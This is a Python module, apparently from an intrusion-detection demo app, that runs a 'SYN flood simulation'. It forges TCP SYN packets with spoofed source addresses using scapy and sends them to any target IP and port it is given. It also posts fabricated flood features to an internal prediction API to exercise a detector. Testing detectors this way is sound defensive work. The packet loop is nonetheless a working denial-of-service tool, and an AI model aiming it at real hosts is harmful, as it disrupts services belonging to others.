from scapy.all import IP, TCP, send, RandShort
import asyncio
from typing import Dict, Any, Callable, Coroutine
from .simulation_params import SYNFloodParams
from app.core import state
import random
import httpx
import os
import traceback 

INTERNAL_API_BASE_URL = os.getenv("INTERNAL_API_BASE_URL", "http://localhost:8000")

def generate_fake_synflood_features():
    if not state.feature_columns: return {}
    features = {key: 0.0 for key in state.feature_columns}

    features.update({
        'Flow_Duration':            random.uniform(1, 5000),      # Extremely short duration
        'Total_Fwd_Packets':        1.0,                          # Only one forward packet
        'Total_Bwd_Packets':        0.0,                          # No backward packets
        'Total_Fwd_Bytes':          0.0,
        'Total_Bwd_Bytes':          0.0,
        'Fwd_Packet_Length_Mean':   0.0,
        'Bwd_Packet_Length_Mean':   0.0,
        'Packet_Length_Mean':       0.0,
        'SYN_Flag_Count':           1.0,                          # The most important signature
        'FIN_Flag_Count':           0.0,
    })
    return features

async def trigger_prediction(simulation_id: str):
    try:
        features = generate_fake_synflood_features()
        fake_source_ip = f"10.42.{random.randint(1, 254)}.{random.randint(1, 254)}"
        
        async with httpx.AsyncClient() as client:
            await client.post(
                f"{INTERNAL_API_BASE_URL}/api/predict",
                json={
                    "features": features,
                    "source_info": f"synflood_sim_{fake_source_ip}",
                    "simulation_id": simulation_id
                },
                timeout=10.0
            )
    except Exception as e:
        print(f" Error during SYN Flood prediction trigger: {e}")

async def run_synflood_simulation(
    params: SYNFloodParams,
    progress_callback: Callable[[Dict[str, Any]], Coroutine[Any, Any, None]],
    simulation_run_id: str
) -> Dict[str, Any]:
    print(f"Starting SYN Flood Simulation: Target={params.target_ip}:{params.target_port}")
    sent_packets = 0
    await progress_callback({"type": "progress", "message": "Initiating SYN Flood...", "completed": 0, "total": params.num_packets})
    
    def send_packets_sync():
        nonlocal sent_packets
        try:
            for i in range(params.num_packets):
                # Forge a TCP SYN packet with a random source IP and port
                source_ip = f"192.168.1.{random.randint(1, 254)}"
                ip_layer = IP(src=source_ip, dst=params.target_ip)
                tcp_layer = TCP(sport=RandShort(), dport=params.target_port, flags="S")
                packet = ip_layer / tcp_layer
                 # Send the packet
                send(packet, verbose=0)
                sent_packets += 1
                # Periodically report progress and trigger AI detection
                if sent_packets % 20 == 0 or sent_packets == params.num_packets:
                    asyncio.run(progress_callback({"type": "progress", "message": f"Sent {sent_packets}/{params.num_packets} SYN packets...", "completed": sent_packets, "total": params.num_packets}))
                    asyncio.run(trigger_prediction(simulation_run_id))

                if params.delay_seconds > 0:
                    asyncio.run(asyncio.sleep(params.delay_seconds))
            return {"status": "Completed", "error": None}
        except Exception as e:
             # Catch potential errors
            return {"status": "Failed", "error": e}
            
    loop = asyncio.get_running_loop()
    # Run the blocking
    result_dict = await loop.run_in_executor(None, send_packets_sync)
    
    if result_dict["status"] == "Failed":
        error_message = f"An error occurred during SYN Flood: {result_dict['error']}. Note: Sending raw packets might require root/administrator privileges."
        print(f" {error_message}")
        await progress_callback({"type": "error", "message": error_message})
        return {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Failed", "error": str(result_dict['error'])}
    # Prepare the final result
    result = {"target_ip": params.target_ip, "target_port": params.target_port, "total_packets_sent": sent_packets, "status": "Completed"}
    await progress_callback({"type": "final_summary", "message": "SYN Flood simulation completed."})
    return result